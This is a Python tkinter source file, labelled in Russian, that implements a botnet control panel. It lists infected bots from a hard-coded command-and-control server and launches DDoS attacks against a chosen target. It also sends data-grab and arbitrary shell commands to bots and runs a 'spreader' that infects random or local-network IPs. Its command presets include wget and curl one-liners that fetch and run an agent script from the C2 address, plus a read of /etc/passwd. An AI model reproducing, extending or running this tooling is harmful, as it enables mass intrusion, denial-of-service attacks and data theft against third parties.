import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
import threading, socket, json, time, subprocess, os

# Словарь команд с пояснениями
COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.spreader_process = None
        self.bots = {}
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # ===== Вкладка "Боты" =====
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")

        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)

        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Цвета статусов (тёмные)
        self.tree.tag_configure('online', foreground='#007700')
        self.tree.tag_configure('offline', foreground='#cc0000')

        # Контекстное меню
        self.context_menu = tk.Menu(self.tree, tearoff=0)
        self.context_menu.add_command(label="Атака", command=self._ctx_attack)
        self.context_menu.add_command(label="Граб", command=self._ctx_grab)
        self.context_menu.add_command(label="Стоп", command=self._ctx_stop)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Выполнить команду...", command=self._ctx_exec)
        self.context_menu.add_command(label="Копировать IP", command=self._ctx_copy_ip)
        self.tree.bind("<Button-3>", self._on_right_click)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # ===== Вкладка "Спредер" =====
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)
        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
        self.spin_count.pack(side=tk.LEFT, padx=5)
        self.local_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
        self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
        self.btn_start_spread.pack(side=tk.LEFT, padx=10)
        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # ===== Пользовательские команды =====
        cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)

        # Выпадающий список с описаниями (отображаем ключи словаря)
        self.cmd_var = tk.StringVar()
        self.cmd_combo = ttk.Combobox(cmd_frame, textvariable=self.cmd_var,
                                      values=list(COMMAND_PRESETS.keys()), width=50, state='readonly')
        self.cmd_combo.grid(row=1, column=0, padx=5, pady=2, sticky='ew')
        self.cmd_combo.bind('<<ComboboxSelected>>', self._on_cmd_select)

        # Пояснение к выбранной команде
        self.cmd_desc_label = ttk.Label(cmd_frame, text="", foreground="#555555")
        self.cmd_desc_label.grid(row=2, column=0, padx=5, sticky='w')

        # Поле для своей команды
        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
        self.cmd_entry.grid(row=3, column=0, padx=5, pady=2, sticky='ew')

        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).grid(row=1, column=1, padx=5)
        cmd_frame.columnconfigure(0, weight=1)

        # Устанавливаем первую команду по умолчанию
        if COMMAND_PRESETS:
            first_cmd = list(COMMAND_PRESETS.keys())[0]
            self.cmd_combo.set(first_cmd)
            self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])

    # ----- Контекстное меню -----
    def _on_right_click(self, event):
        row = self.tree.identify_row(event.y)
        if row:
            self.tree.selection_set(row)
            self.context_menu.post(event.x_root, event.y_root)

    def _ctx_attack(self): self.launch_attack()
    def _ctx_grab(self): self.launch_grab()
    def _ctx_stop(self): self.stop_selected()
    def _ctx_exec(self):
        selected = self.tree.selection()
        if not selected: return
        cmd = simpledialog.askstring("Команда", "Введите команду:")
        if cmd: self._send_custom_to_bots(cmd)
    def _ctx_copy_ip(self):
        selected = self.tree.selection()
        if selected:
            ip = self.tree.item(selected[0], 'values')[0]
            self.clipboard_clear()
            self.clipboard_append(ip)
            messagebox.showinfo("Скопировано", f"IP {ip} скопирован")

    # ----- Выбор команды -----
    def _on_cmd_select(self, event=None):
        selected = self.cmd_combo.get()
        if selected in COMMAND_PRESETS:
            self.cmd_desc_label.config(text=COMMAND_PRESETS[selected])
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, selected)

    # ----- Обновление списка ботов -----
    def _auto_refresh(self):
        self.refresh_bots()
        self.after(5000, self._auto_refresh)

    def refresh_bots(self):
        threading.Thread(target=self._fetch_bots, daemon=True).start()

    def _fetch_bots(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(b"list")
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
            sock.close()
            bots = json.loads(data)
            self.after(0, self._update_tree_safe, bots)
        except Exception as e:
            print(f"[BotnetTab] Ошибка обновления: {e}")

    def _update_tree_safe(self, bots):
        selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
        self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
        for item in self.tree.get_children():
            self.tree.delete(item)
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            ip = bot.get("ip")
            if ip == "77.79.168.92": continue
            status = bot.get("status", "offline")
            tag = 'online' if status == 'online' else 'offline'
            values = (ip, bot.get("hostname",""), bot.get("os",""),
                      bot.get("cpu",""), bot.get("ram",""), status,
                      bot.get("rps",0), bot.get("last_seen",""))
            self.tree.insert("", "end", values=values, tags=(tag,))
            if status == 'online': online += 1
            total_rps += int(bot.get("rps",0))
        for item in self.tree.get_children():
            if self.tree.item(item, 'values')[0] in selected_ips:
                self.tree.selection_add(item)
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")

    def _send_raw(self, msg):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(msg.encode())
            resp = sock.recv(1024)
            sock.close()
            return resp
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
            return None

    def launch_attack(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        target = simpledialog.askstring("Цель", "URL/IP цели:")
        if not target: return
        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
        if not method: return
        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
        if threads is None: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")
        messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов")

    def launch_grab(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"grab:{','.join(bot_ips)}")
        messagebox.showinfo("Граб", "Команда захвата данных отправлена")

    def stop_selected(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"stop:{','.join(bot_ips)}")
        messagebox.showinfo("Стоп", "Команда остановки атаки отправлена")

    def _send_custom_to_bots(self, cmd):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        ips = [self.tree.item(i, "values")[0] for i in selected]
        for ip in ips:
            self._send_raw(f"exec:{ip}:{cmd}")
        messagebox.showinfo("Команда", f"Команда '{cmd}' отправлена на {len(ips)} ботов")

    def send_custom_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            messagebox.showwarning("Ошибка", "Введите или выберите команду")
            return
        self._send_custom_to_bots(cmd)

    # ----- Спредер -----
    def _on_local_changed(self):
        if self.local_var.get():
            self.spin_count.configure(state='disabled')
        else:
            self.spin_count.configure(state='normal')

    def toggle_spreader(self):
        if self.spreader_process and self.spreader_process.poll() is None:
            self.spreader_process.terminate()
            self.btn_start_spread.config(text="Запустить спредер")
            self.spread_log.insert(tk.END, "[*] Спредер остановлен\n")
            self.spreader_process = None
        else:
            count = self.scale_var.get() if not self.local_var.get() else 254
            mode = "локальная сеть" if self.local_var.get() else f"{count} случайных IP"
            self.spread_log.insert(tk.END, f"[*] Запуск спредера, {mode}\n")
            threading.Thread(target=self._run_spreader, args=(count, self.local_var.get()), daemon=True).start()

    def _run_spreader(self, count, local_mode=False):
        try:
            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            cmd = ["python", script_path]
            if local_mode:
                cmd.append("--local")
            else:
                cmd += ["--count", str(count)]
            self.spreader_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
            )
            self.btn_start_spread.config(text="Остановить спредер")
            for line in iter(self.spreader_process.stdout.readline, ''):
                self.spread_log.insert(tk.END, line)
                self.spread_log.see(tk.END)
        except Exception as e:
            import traceback
            self.spread_log.insert(tk.END, f"[!] Ошибка: {traceback.format_exc()}\n")
            self.btn_start_spread.config(text="Запустить спредер")
